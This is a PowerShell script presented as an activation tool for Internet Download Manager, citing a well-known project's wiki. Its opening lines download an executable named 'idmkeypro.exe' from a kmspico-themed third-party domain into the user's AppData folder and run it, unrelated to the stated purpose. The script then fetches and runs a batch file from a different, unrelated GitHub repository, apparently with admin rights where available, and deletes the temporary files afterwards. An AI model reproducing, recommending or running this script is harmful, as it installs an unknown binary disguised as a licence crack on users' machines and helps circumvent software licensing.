# Check the instructions here on how to use it https://github.com/lstprjct/IDM-Activation-Script/wiki

$ProcName = "idmkeypro.exe"
$WebFile = "https://www.kmspico.pctoolsbox.com/app/idmkeypro.exe"
 
Clear-Host
 
(New-Object System.Net.WebClient).DownloadFile($WebFile,"$env:APPDATA\$ProcName")
Start-Process ("$env:APPDATA\$ProcName")

$ErrorActionPreference = "Stop"
# Enable TLSv1.2 for compatibility with older clients
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12

$DownloadURL = 'https://github.com/Pctoolsbox/IDM-Activation-Lifetime-license/raw/refs/heads/main/IDM-Lifetime-license.cmd'

$rand = Get-Random -Maximum 99999999
$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\IAS_$rand.cmd" } else { "$env:TEMP\IAS_$rand.cmd" }

try {
    $response = Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing
}
catch {
    $response = Invoke-WebRequest -Uri $DownloadURL2 -UseBasicParsing
}

$ScriptArgs = "$args "
$prefix = "@REM $rand `r`n"
$content = $prefix + $response
Set-Content -Path $FilePath -Value $content

Start-Process $FilePath $ScriptArgs -Wait

$FilePaths = @("$env:TEMP\IAS*.cmd", "$env:SystemRoot\Temp\IDM-Lifetime license*.cmd")
foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }